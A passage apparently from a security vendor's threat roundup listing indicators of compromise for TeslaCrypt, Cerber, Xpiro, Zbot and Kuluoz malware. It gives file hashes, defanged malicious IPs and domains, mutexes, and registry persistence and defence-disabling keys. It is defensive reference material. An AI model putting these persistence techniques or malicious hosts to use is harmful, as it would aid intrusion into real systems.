2f96ceac3a3043d57e6df78df5cd36b3ee2f79d0a983e454adc0baa22c7880ce 48f8c92e3b3d82bdc011476b5aa012a46a849a2229714bae4166b00d9b09d122 50891ef026bd10528bc51972ac5bee469bf5a28322f39dbb5b68098d7ba45971 669c85491087f3050135330eb1ea7d4b53d27f75b04fa26be651944c2d099a79 6bc6ecc0f25d2472fc1600c031de35c61603c07b530f5a10d3a3a5ceac700afd 72854daf36aa3568be5178ea984cd1acb1de9fe939ebdc1379d3e9b5e0df9ba4 762d000685a08620f23bb3b1eac6d5e5566839e3345700f8feff505d1b5c8ab5 84485d05542acc47b7d17197894af35114cf02886d468b40111620c6d0f9c6a1 851564492f26a349fd730ff1ef8213b0e7526a44f00c2ed305908c045af955fd 8a68686ef06978754ce55ae2b0de128b6f2818b8d2c2b538293a40f2c6e636ed 8a6f8710dbff2d1fe7f0b039d4d3312fba21cc52df0283c607958018ed400a87 92614b51012dadfa944974085e64789e15f38200bb0837663d143736ec248196 *See JSON for more IOCs Coverage Product Protection Secure Endpoint Cloudlock N/A CWS Email Security Network Security N/A Stealthwatch N/A Stealthwatch Cloud N/A Secure Malware Analytics Umbrella N/A WSA N/A Screenshots of Detection Secure Endpoint Secure Malware Analytics MITRE ATT&CK Win.Ransomware.TeslaCrypt-9972505-0 Indicators of Compromise IOCs collected from dynamic analysis of 19 samples Registry Keys Occurrences <HKLM>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM Value Name: EnableLinkedConnections 19 <HKCU>\SOFTWARE\XXXSYS 19 <HKCR>\LOCAL SETTINGS\MUICACHE\82\52C64B7E Value Name: LanguageList 19 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\ACTION CENTER\CHECKS\{C8E6F269-B90A-4053-A3BE-499AFCEC98C4}.CHECK.0 Value Name: CheckSetting 19 <HKCU>\SOFTWARE\XXXSYS Value Name: ID 19 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE Value Name: 1qwqwqe-r213 19 <HKCU>\Software\<random, matching '[A-Z0-9]{14,16}'> 19 <HKCU>\Software\<random, matching '[A-Z0-9]{14,16}'> Value Name: data 19 Mutexes Occurrences __sys_234238233295 19 IP Addresses contacted by malware. Does not indicate maliciousness Occurrences 217[.]116[.]196[.]239 19 27[.]254[.]33[.]44 19 23[.]221[.]227[.]169 13 104[.]21[.]63[.]74 11 172[.]67[.]170[.]68 8 185[.]230[.]63[.]171 7 23[.]221[.]227[.]165 7 185[.]230[.]63[.]186 6 185[.]230[.]63[.]107 6 Domain Names contacted by malware. Does not indicate maliciousness Occurrences chonburicoop[.]net 19 ladiesdehaan[.]be 19 actionpourisrael[.]com 19 hnb[.]net 19 firecheerleaders[.]fr 19 passlift[.]com 19 apps[.]identrust[.]com 19 Files and or directories created Occurrences %ProgramFiles%\7-Zip\Lang\mng.txt 19 %ProgramFiles%\7-Zip\Lang\mng2.txt 19 %ProgramFiles%\7-Zip\Lang\mr.txt 19 %ProgramFiles%\7-Zip\Lang\ms.txt 19 %ProgramFiles%\7-Zip\Lang\nb.txt 19 %ProgramFiles%\7-Zip\Lang\ne.txt 19 %ProgramFiles%\7-Zip\Lang\nl.txt 19 %ProgramFiles%\7-Zip\Lang\nn.txt 19 %ProgramFiles%\7-Zip\Lang\pa-in.txt 19 %ProgramFiles%\7-Zip\Lang\pl.txt 19 %ProgramFiles%\7-Zip\Lang\ps.txt 19 %ProgramFiles%\7-Zip\Lang\pt-br.txt 19 %ProgramFiles%\7-Zip\Lang\pt.txt 19 %ProgramFiles%\7-Zip\Lang\ro.txt 19 %ProgramFiles%\7-Zip\Lang\ru.txt 19 %ProgramFiles%\7-Zip\Lang\sa.txt 19 %ProgramFiles%\7-Zip\Lang\si.txt 19 %ProgramFiles%\7-Zip\Lang\sk.txt 19 %ProgramFiles%\7-Zip\Lang\sl.txt 19 %ProgramFiles%\7-Zip\Lang\sq.txt 19 %ProgramFiles%\7-Zip\Lang\sr-spc.txt 19 %ProgramFiles%\7-Zip\Lang\sr-spl.txt 19 %ProgramFiles%\7-Zip\Lang\sv.txt 19 %ProgramFiles%\7-Zip\Lang\ta.txt 19 %ProgramFiles%\7-Zip\Lang\th.txt 19 *See JSON for more IOCs File Hashes 0aac8016a240da6caba10d61a644b27b75975d3560407d6ea097308aeb470b9e 13b9d082901d9d0608e87c114af8763094c10142d7394fd57e94e88101780c10 23d40e0777ec7d49883818310a265051ebb6ae97603fdc59ba3e5c6b843fe0bd 365d84800d9e8a683770478b21f8ff95af5a5e6c49491a4d29f9770c97c6749b 44dc523fce3124abb61430329ec664094d9365bfe5fdf657ca7aeff27674e863 48dd2915d3404e6149f2b0b1c68223131f860e103fa98f076cc0603da2b68cd1 4de6675c089aad8a52993b1a21afd06dc7086f4ea948755c09a7a8471e4fddbd 65bfdfabf0a6f8937118db94cbcab36e9a0abc5de986c4d8d7c9876f55110b4b 660031fa2a2fbf6a4cf24a019da764d0069dd4830c56e647bc59aa0073eb6044 79fd01f7b47fdfee48983565b9481b91d30bca7cbac9039b0422cd7b82c21e67 7ebfbcad908fa1ee22db680772f716ef9a5b42ce59e293c81185754be26206be 86ea4df17ba0a68276d5a13534d0b70482e5b97f0da3013dc757c79018de1077 893d875bd015aea541453e93f3a2756b31560c3d372a4191b06fb2f7613903ff 8982563b88cc88b1a28764c5ffb847681b347e7c3f9d811ee917dd97a823afe7 89992094e7c6200e72f0b5be234c82c4dfdfd9679795d2f9ece85af65282ce2e bb35d6fea828d528dbaac0ab1b269e7124bf42ea61f7125f622c7cc0578e2927 bc3bf0b19db80fd01c7d44609424a6b396558a017be7dab8b27880ba2157fec6 cde1f8429bd3a171435825f58d5957a5cc0ab164ec30ca701999afd5c71faf16 fd4ab3f109b5f3c0dffa7842490044218a49e99dd1940c5adb0ec042fefe0d07 Coverage Product Protection Secure Endpoint Cloudlock N/A CWS Email Security Network Security Stealthwatch N/A Stealthwatch Cloud N/A Secure Malware Analytics Umbrella WSA Screenshots of Detection Secure Endpoint Secure Malware Analytics MITRE ATT&CK Win.Ransomware.Cerber-9972520-0 Indicators of Compromise IOCs collected from dynamic analysis of 26 samples Registry Keys Occurrences <HKCU>\PRINTERS\DEFAULTS\{21A3D5EE-E123-244A-98A1-8E36C26EFF6D} 26 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\EXPLORER Value Name: Run 26 <HKCU>\SOFTWARE\MICROSOFT\COMMAND PROCESSOR Value Name: AutoRun 26 <HKCU>\PRINTERS\DEFAULTS 26 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: expand 2 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE Value Name: expand 2 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: RMActivate_ssp 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE Value Name: RMActivate_ssp 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: rasdial 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE Value Name: rasdial 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: systeminfo 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE Value Name: systeminfo 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: ntoskrnl 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE Value Name: ntoskrnl 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: waitfor 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE Value Name: waitfor 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: TapiUnattend 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE Value Name: TapiUnattend 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: ipconfig 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE Value Name: ipconfig 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: cipher 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE Value Name: cipher 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: msdt 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE Value Name: msdt 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: wuapp 1 Mutexes Occurrences shell.{381828AA-8B28-3374-1B67-35680555C5EF} 26 IP Addresses contacted by malware. Does not indicate maliciousness Occurrences 208[.]95[.]112[.]1 26 31[.]184[.]234[.]0/23 26 Domain Names contacted by malware. Does not indicate maliciousness Occurrences ip-api[.]com 26 Files and or directories created Occurrences %APPDATA%\{6F885251-E36F-0FE6-9629-63208157D7A2} 26 %APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp\expand.lnk 2 %APPDATA%\{6F885251-E36F-0FE6-9629-63208157D7A2}\expand.exe 2 %System32%\Tasks\expand 2 %APPDATA%\{6F885251-E36F-0FE6-9629-63208157D7A2}\cipher.exe 1 %APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp\RMActivate_ssp.lnk 1 %APPDATA%\{6F885251-E36F-0FE6-9629-63208157D7A2}\RMActivate_ssp.exe 1 %System32%\Tasks\RMActivate_ssp 1 %APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp\rasdial.lnk 1 %APPDATA%\{6F885251-E36F-0FE6-9629-63208157D7A2}\rasdial.exe 1 %System32%\Tasks\waitfor 1 %APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp\waitfor.lnk 1 %APPDATA%\{6F885251-E36F-0FE6-9629-63208157D7A2}\waitfor.exe 1 %APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp\systeminfo.lnk 1 %APPDATA%\{6F885251-E36F-0FE6-9629-63208157D7A2}\systeminfo.exe 1 %APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp\msdt.lnk 1 %APPDATA%\{6F885251-E36F-0FE6-9629-63208157D7A2}\msdt.exe 1 %System32%\Tasks\osk 1 %System32%\Tasks\cipher 1 %System32%\Tasks\upnpcont 1 %APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp\upnpcont.lnk 1 %APPDATA%\{6F885251-E36F-0FE6-9629-63208157D7A2}\upnpcont.exe 1 %APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp\PkgMgr.lnk 1 %APPDATA%\{6F885251-E36F-0FE6-9629-63208157D7A2}\PkgMgr.exe 1 %System32%\Tasks\PkgMgr 1 *See JSON for more IOCs File Hashes 0356531648ab4411f5f350096c303c8f1a83028cd44a2cf54afbf0c7d524fdbb 0763d45d5c507f58d94f48e83df180b50506ccb4a37d3c6a295c72b132b2a6ca 105e1dc7b5427fc6ec03d85babf6b06076ae77584af978b9780a3c38079b14b8 1122b26a4019ec83fab65658fe3111e68b1e8b0be5c430355d3da8071ca10e2a 127facd115346c4f5363ffcbf9c84005ac78a276af5a79503d3784c4d356ca76 138cfda30c320d579922f0ba8a27559bc7e255848f46a49172fcad5666c17844 13ec4157c4a3de32cf913e1a6cb3eedb3cd4944ef982aafce36b727858ac632b 197df7641497a63ca533ce42bf60da19436ebb5d37e2d48f0a8729078ce8133f 200f2572a4f6ac43dd4e174d4051662d5b334d7eecac7726faeb4ea226e4c8ea 23458406bd7f16dae66c0db26a919e55692fecb1f8efd505844c13be41457aaa 2fecb09e01ffcd3365d89da9ed7da1860cf4a2ab383ca384577aa4fa4a872801 305df060b375af6922e7bb38cfef8290787ef1bcc43740bdb8dd40d91e6ab33c 39bfbdfdc34559ad7893ff5a666ea4ca591c1e54288752a8958f62922a76dc88 4a17cd2abc60459e8f4e70047fd986aebb2f178e05eb1e0869cd56f752f5e0f6 4d9ffc147efb29f2ed7e8f8e0c106fb49a124c366ac8bc9279c9052145387ffc 513c35c43300038ca4065013ff5fc8b1ae809c353ae5a3c896f33493d8357ac4 5c814970df47b6be03b265aa8912e7b9d88044b5b5cfa8042c03cf4df268ebe3 5f1612638feae15e1ed1957845e94573a556d4dc3fa890980e3d8f5f5b45f205 5f8cd7a2bd99a8214c7a25a6784d082abf440f17b916df09f73270903f465543 63a50198f7d03b021e2d7f06ed51fb4e847fadd3529c54658d40d10676576f74 652d84eb8fccf048292a2e3aabf3c04535648af5e691d915cedf24478738da43 6e080f3afc5d9b4c55b46723c471b638655425df7f569b5283902e077e6ae362 799f19155411d98e3c69c4d005678c0efae337e5212f16d475e26650e61a242f 7b9374fd33a31b2f39d536bc394b26ab045369cd3b903c6a98de2237751663ad 7de9fe531c7a049139b75f97f311ef487faacbd2a848ea767232e0c444c0d79f *See JSON for more IOCs Coverage Product Protection Secure Endpoint Cloudlock N/A CWS Email Security Network Security Stealthwatch N/A Stealthwatch Cloud N/A Secure Malware Analytics Umbrella N/A WSA N/A Screenshots of Detection Secure Endpoint Secure Malware Analytics MITRE ATT&CK Win.Virus.Xpiro-9972647-1 Indicators of Compromise IOCs collected from dynamic analysis of 25 samples Registry Keys Occurrences <HKLM>\SYSTEM\CONTROLSET001\SERVICES\WSCSVC Value Name: Start 25 <HKLM>\SYSTEM\CONTROLSET001\SERVICES\WINDEFEND Value Name: Start 25 <HKLM>\SYSTEM\CONTROLSET001\SERVICES\CLR_OPTIMIZATION_V2.0.50727_32 Value Name: Type 25 <HKLM>\SYSTEM\CONTROLSET001\SERVICES\CLR_OPTIMIZATION_V4.0.30319_32 Value Name: Type 25 <HKLM>\SYSTEM\CONTROLSET001\SERVICES\CLR_OPTIMIZATION_V4.0.30319_32 Value Name: Start 25 <HKLM>\SYSTEM\CONTROLSET001\SERVICES\COMSYSAPP Value Name: Type 25 <HKLM>\SYSTEM\CONTROLSET001\SERVICES\COMSYSAPP Value Name: Start 25 <HKLM>\SYSTEM\CONTROLSET001\SERVICES\MOZILLAMAINTENANCE Value Name: Type 25 <HKLM>\SYSTEM\CONTROLSET001\SERVICES\MOZILLAMAINTENANCE Value Name: Start 25 <HKLM>\SYSTEM\CONTROLSET001\SERVICES\MSISERVER Value Name: Type 25 <HKLM>\SYSTEM\CONTROLSET001\SERVICES\MSISERVER Value Name: Start 25 <HKLM>\SYSTEM\CONTROLSET001\SERVICES\OSE Value Name: Type 25 <HKLM>\SYSTEM\CONTROLSET001\SERVICES\OSE Value Name: Start 25 <HKLM>\SOFTWARE\WOW6432NODE\MICROSOFT\SECURITY CENTER\SVC\S-1-5-21-2580483871-590521980-3826313501-500 25 <HKLM>\SOFTWARE\WOW6432NODE\MICROSOFT\SECURITY CENTER\SVC\S-1-5-21-2580483871-590521980-3826313501-500 Value Name: EnableNotifications 25 <HKLM>\SYSTEM\CONTROLSET001\SERVICES\CLR_OPTIMIZATION_V2.0.50727_32 Value Name: Start 25 <HKLM>\SYSTEM\CONTROLSET001\SERVICES\AELOOKUPSVC Value Name: Type 25 <HKLM>\SYSTEM\CONTROLSET001\SERVICES\AELOOKUPSVC Value Name: Start 25 <HKLM>\SOFTWARE\WOW6432NODE\MICROSOFT\.NETFRAMEWORK\V2.0.50727\NGENSERVICE\STATE Value Name: AccumulatedWaitIdleTime 25 <HKLM>\SOFTWARE\WOW6432NODE\MICROSOFT\.NETFRAMEWORK\V2.0.50727\NGENSERVICE\LISTENEDSTATE Value Name: RootstoreDirty 25 Mutexes Occurrences kkq-vx_mtx67 25 kkq-vx_mtx68 25 kkq-vx_mtx69 25 kkq-vx_mtx70 25 kkq-vx_mtx71 25 kkq-vx_mtx72 25 kkq-vx_mtx73 25 kkq-vx_mtx74 25 kkq-vx_mtx75 25 kkq-vx_mtx76 25 kkq-vx_mtx77 25 kkq-vx_mtx78 25 kkq-vx_mtx79 25 kkq-vx_mtx80 25 kkq-vx_mtx81 25 kkq-vx_mtx82 25 kkq-vx_mtx83 25 kkq-vx_mtx84 25 kkq-vx_mtx85 25 kkq-vx_mtx86 25 kkq-vx_mtx87 25 kkq-vx_mtx88 25 kkq-vx_mtx89 25 kkq-vx_mtx90 25 kkq-vx_mtx91 25 *See JSON for more IOCs Files and or directories created Occurrences %CommonProgramFiles(x86)%\microsoft shared\Source Engine\OSE.EXE 25 %ProgramFiles(x86)%\Microsoft Office\Office14\GROOVE.EXE 25 %ProgramFiles(x86)%\Mozilla Maintenance Service\maintenanceservice.exe 25 %SystemRoot%\Microsoft.NET\Framework\v2.0.50727\mscorsvw.exe 25 %SystemRoot%\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe 25 %SystemRoot%\Microsoft.NET\Framework\v2.0.50727\ngen_service.log 25 %SystemRoot%\Registration\{02D4B3F1-FD88-11D1-960D-00805FC79235}.{33EC2C09-9668-4DE7-BCC0-EFC69D7355D7}.crmlog 25 %SystemRoot%\SysWOW64\dllhost.exe 25 %SystemRoot%\SysWOW64\msiexec.exe 25 %SystemRoot%\SysWOW64\svchost.exe 25 %SystemRoot%\Microsoft.NET\Framework\v4.0.30319\ngen_service.log 25 %SystemRoot%\SysWOW64\dllhost.vir 25 %SystemRoot%\SysWOW64\msiexec.vir 25 %SystemRoot%\SysWOW64\svchost.vir 25 %SystemRoot%\Microsoft.NET\Framework\v4.0.30319\ngenservicelock.dat 25 %SystemRoot%\Microsoft.NET\Framework\v2.0.50727\ngen_service.lock 25 %SystemRoot%\Microsoft.NET\Framework\v2.0.50727\ngenservicelock.dat 25 %CommonProgramFiles(x86)%\microsoft shared\source engine\ose.vir 25 %ProgramFiles(x86)%\microsoft office\office14\groove.vir 25 %ProgramFiles(x86)%\mozilla maintenance service\maintenanceservice.vir 25 %SystemRoot%\microsoft.net\framework\v2.0.50727\mscorsvw.vir 25 %SystemRoot%\microsoft.net\framework\v4.0.30319\mscorsvw.vir 25 %ProgramData%\Mozilla\logs\maintenanceservice.log 25 %SystemRoot%\Microsoft.NET\Framework\v4.0.30319\ngenofflinequeuelock.dat 25 %SystemRoot%\Microsoft.NET\ngenservice_pri1_lock.dat 25 *See JSON for more IOCs File Hashes 080a1db230eaaf408fea0e76fc32baf288bb5cc29a690be8e6a0eb2d98d72069 092facc597b03b52d67baf47cf3a0a2ac61bc18b2d300ff23a8ddcc51dae7381 09cb753436065b7734c3f13a80e837575e5953433a0cd3e03d8736e802d47e6e 0c992aadb78c91d777d2f82a47e8bf4fc3df5944efbc96cf13f40220af4dff16 1d3750731ee032528891a55113cff2ae5834c423679a84c835c5dfe527ada46f 1e7cd7bef018b3b416e6b9ebf80616df50430ff8fa0f8013a38bb50c1484ad07 2307d4c01fd3409dd09cb4d4410e6b9e732933e607dca0ec788eaeb653498b7e 2fa967b0c8c3d63bbbfc9ffcf62f07491fcc945bba13d818c089da6562002521 30fc613150e07680acebaef73e7d2e90323ff2fc25cef83bada71e5cd2e488a5 36d14b93e74bec6e9e65a0adce04d283b0ba652d1cea34531327f982e26026fa 40099123e2553642318e963fb644aa998871069a99fec399fff56812ecfb9f3a 4e253d34579924dd8f6dfc0db889fbd11e8bbedc9e97dcfed3a2c66d8bc539f5 573e44560ec03a480499c33e208f07694fbf9014624e8458a11acf3c91d4ac86 5e4dd297b77b22d5af4f1e0a2d6491faee63321ce78e8fbeabd99e60f5875071 74cb267ae42cb4d05b5824b8b15b143ce966db6b9826dcc5d059b63f3a4472ee 7cbdf8cba9c0a6ba7e088ab1f169392b57a691132d73392a1649eab0afe42a9f 99f58513264d50d442f6f05074f7cff9703caa1eb3f9fc087e48bd1bd236759f 9d4fb7c69ed2e30ad402fc536caae122ace345d95ff306c026b3262558f7c5a6 bfc69100e2055bfb88171d88616fa70afb0b6170d944bdf068953c7cd9d04368 da7c97b9fa3fcd2823d28477aa13372cd2a1e8645f20d12e85afbba5baa5adbd efce6cd3e73a416d0cc920ca76f148499f78080ffbbc166bf535f37854a57fe7 f76e338c200b85d9761f81835729cede7d6255f2da04e87bb651943be7cdf97c fb33d2b921ba402f9557709f3991f37e64084e6e56968a2e3d111c758b270202 fc9d5c1729a6f5c1ea3ffbb242c344ea475f029dbfb98d966885a89a0cd965ab fe485abd2c82271a87c0bdb10db4efff2f64debdc31b4d1abf52e3bfbaef4cff *See JSON for more IOCs Coverage Product Protection Secure Endpoint Cloudlock N/A CWS Email Security Network Security N/A Stealthwatch N/A Stealthwatch Cloud N/A Secure Malware Analytics Umbrella N/A WSA N/A Screenshots of Detection Secure Endpoint Secure Malware Analytics MITRE ATT&CK Win.Trojan.Zbot-9972724-0 Indicators of Compromise IOCs collected from dynamic analysis of 28 samples Registry Keys Occurrences <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: FAFEB955 24 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: {32382BC4-48A5-6DE8-F0EE-B8109DEC3228} 1 <HKCU>\SOFTWARE\MICROSOFT\INTERNET EXPLORER\PHISHINGFILTER Value Name: EnabledV8 1 <HKCU>\SOFTWARE\MICROSOFT\INTERNET EXPLORER\PHISHINGFILTER Value Name: EnabledV9 1 <HKCR>\LOCAL SETTINGS\SOFTWARE\MICROSOFT\WINDOWS\SHELL\BAGS\159 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: MsDtc 1 <HKLM>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: yremyhov 1 Mutexes Occurrences qazwsxedc 28 FAFEB955 24 Global\ukacizefetatoxonoxajozeliriwoca 1 Global\yjabekozydyhygulyhexeso 1 IP Addresses contacted by malware. Does not indicate maliciousness Occurrences 201[.]175[.]17[.]35 1 173[.]230[.]130[.]252 1 188[.]165[.]235[.]13 1 Domain Names contacted by malware. Does not indicate maliciousness Occurrences scrafort[.]ru 1 pokamelix[.]net 1 Files and or directories created Occurrences %HOMEPATH%\AppData\LocalLow\FAFEB955 24 %APPDATA%\FAFEB955 24 %APPDATA%\FAFEB955\bin.exe 24 %APPDATA%\s928_043.bat 1 %APPDATA%\MsDtc 1 %ProgramData%\ubabehuzohahirol 1 %ProgramData%\ubabehuzohahirol\01000000 1 %ProgramData%\ubabehuzohahirol\00000000 1 %ProgramData%\ubabehuzohahirol\02000000 1 %SystemRoot%\yrimonoj.exe 1 File Hashes 0390003f4f7ba18e64912fe1337a696cc6f1872716e5b61e0da335a403ded7c5 0423c8c664cb4342a836416a387ef7c5f0cfb027b5a5f4f9d6826e6e43c69142 0a82bb4da5e5e843c17889aa698caf818a34f8ed3c58bb5525f2eb7fd79f83af 0a9ad9e5a4502f5afaa5c103a72181f8db387c03ff238fa884e09092ca1aec10 1000afbdd91acf747e303a770740980dc1bbeaaed0f132237fe1b5c45ee7e4f4 11d5962aed7e8ae84506dace35f101b591002c16bdf296c134a35809f7824ab9 14002cc935cf0d9c0b97ce8dac13ea405bc227d3595285f2ff7c5911eca59665 18f1d6253f5a88894645692a0cf212573be11bc0831c53f0349f30114863439a 1917791b75d7ec9c5254e199ac1335fd764a69cd16a3022332f667769afb11ec 1a189efb3c9b8c7db21f14864d858cdccbe2a0c36e0bd5948f55a799133bf02f 1be9a459e5469612fef17f3fa51ed68c9c1f663ce8bbdd2d47052185f60e1aba 1e2ef6d2489dcef6f4314ce1f91692c52ce64cc18cfff8df04eab8f8eab512b9 1f7025b0f9f0cf1795744cad7a8757fac3ee1fea9de51ae367f199ddf153c778 1f9db435ecfb896e390f90a8163a33014103f90193670709c3c74b984830fcad 214471bd376458cdccae3f64db91bfa101e5e132aa37fda9f78680d82f1a9a61 23484d080f3a9dbbbf945afac92564cc0ef6c472891d4ec73ca9f5d9f33af754 27f08c6ea7a3ce291d3db43b2905192d015854b37eb5292dafebca4673900917 28c8ad043a20c5ccecabc7a9bd6a3c42ef354c37469f050469bb8a8686ad5637 2d3ddfe686cb054acb5ae562cbe8dcc69d93cacc47dee09dbe074a02d67cee7d 2df729a212bbd48be67d830a3ba5b4f6560e499fd1be303910b81fe608bf1846 2f34e105b042e555059d04d448a68a0504b038649f326a884b15b6a11bab9207 33171e47458e55fd3231b38d9ec33973bbb290611abfe956105831315bed943c 33736967493c8526aa2e5e544c4353ea769ece401020e2b18eb13a6026d5be59 38b417c20d96d86e55ba3785d7671fadb081b7df7b68e53f621dac966bc7f337 3b7e84c3c45c35df400f20c6b6d9be4c1ad198e330ce224b7b02066b91332996 *See JSON for more IOCs Coverage Product Protection Secure Endpoint Cloudlock N/A CWS Email Security Network Security N/A Stealthwatch N/A Stealthwatch Cloud N/A Secure Malware Analytics Umbrella N/A WSA N/A Screenshots of Detection Secure Endpoint Secure Malware Analytics MITRE ATT&CK Win.Dropper.Kuluoz-9972735-0 Indicators of Compromise IOCs collected from dynamic analysis of 25 samples Registry Keys Occurrences <HKCU>\SOFTWARE\<random, matching '[a-zA-Z0-9]{5,9}'> 25 <HKCU>\SOFTWARE\GSJVNITL Value Name: vhpprofa 2 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: jintssul 2 <HKCR>\LOCAL SETTINGS\MUICACHE\82\52C64B7E Value Name: @explorer.exe,-7001 1 <HKCU>\SOFTWARE\IBQNGRRJ Value Name: lrihkesw 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: jsjvfjml 1 <HKCU>\SOFTWARE\ISEXODUX Value Name: klxdvqlb 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: irvnwbmg 1 <HKCU>\SOFTWARE\KIPTHOST Value Name: tkcofvhr 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: esnklnfh 1 <HKCU>\SOFTWARE\HGLMDQGG Value Name: hvpqeoep 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: cljiohww 1 <HKCU>\SOFTWARE\PIXXVEDR Value Name: fvtnlluj 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: qbvkabll 1 <HKCU>\SOFTWARE\OGIWSKLJ Value Name: kwbfngcr 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: ajjptuhl 1 <HKCU>\SOFTWARE\EBWFKRUQ Value Name: ocvuwatc 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: utxbmdsc 1 <HKCU>\SOFTWARE\LMJTIFNQ Value Name: vbxnvqar 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: wcwwwfok 1 <HKCU>\SOFTWARE\WAPRAFPN Value Name: ccgddubh 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: cfiaevsd 1 <HKCU>\SOFTWARE\CDEOQJNV Value Name: hfjwqkiv 1 <HKCU>\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN Value Name: bkrdfcrr 1 <HKCU>\SOFTWARE\VCOKJEHV Value Name: nwedcqwe 1 Mutexes Occurrences aaAdministrator 25 abAdministrator 25 IP Addresses contacted by malware. Does not indicate maliciousness Occurrences 82[.]165[.]155[.]77 19 69[.]64[.]32[.]247 19 96[.]30[.]22[.]96 17 85[.]12[.]29[.]254 15 74[.]221[.]221[.]58 12 110[.]77[.]220[.]66 12 95[.]131[.]70[.]168 11 195[.]28[.]181[.]184 9 Files and or directories created Occurrences %LOCALAPPDATA%\<random, matching '[a-z]{8}'>.exe 25 File Hashes 06587673163e3102cffdf7e9d54eefbf8b57e3ec4e118d31c4a647e500783007 0d4819020d9bf81fef8590eb7bcb24874c8d525e782e84d8568a835684c8b0d2 17a9142fbcf022a56e72b62050ad20abbc083a07180b7ee61dc506d9c4073c09 1dd4e2ac41eb1f9c40e33c19c6dbd18216bb88a43835ed1157faa9913459c793 3d5e9d863a64702b596416c0ecfa9541668e8d4c29f9c17c0c16cb2971c31aea 3f7e294c82e7b197f46a415f47cf185a16ed6e341e37011636a8fa92373922c4 47acefdcb7658ab8ccd31ea9fb971bbc1312341a6148c53b7b23da0d5e362b39 5020fc995eca392204546421a6d7108a67e05e3b1d5542aa76240126d94fa8c1 5284522fa9edfbe776f1bba4e31a7e27319ef29ce5a8878ebb79c40d66e7e21b 6131584ef645e47e997a3ba334e9eaf76f52eb47e164d345b62bd6175a776cf5 6b1aabdf6652cc85fe060d76482ac6e5c13b92a624bd925506872b29977364f3 6fc550f88166e80b91e8b1546e06629d5e8d5697b009cee05581ce1765e51638 7fbdc0cbb6086ada84ed5ea5b439847aa882e540914fce381abea115c137fc10 939699e4649833eb081dce8a60e00f37581e4db6961d320adba950b0ee1dd05c a20bb344fd87f2c0ee3747d1886973df1c738d5f5e062df4e51296767eb72a33 a53a1993f4e589299bfdfeb4fcdd2447b1836462332459b35d97a975508f4b6c b123a1f1c0e425e1b77dad3441e130bfc6a2bbdd9e01b560dab27e58820a5c29 b25a6edd96f4737b1e82a62387b43d8fdb65c167367c0c9ee4ef7ae8c7a6ff3f b3581d3b3893d7de52c0ca9f8c7fd95e8e421d792f5969c69562ca144cd9bbef 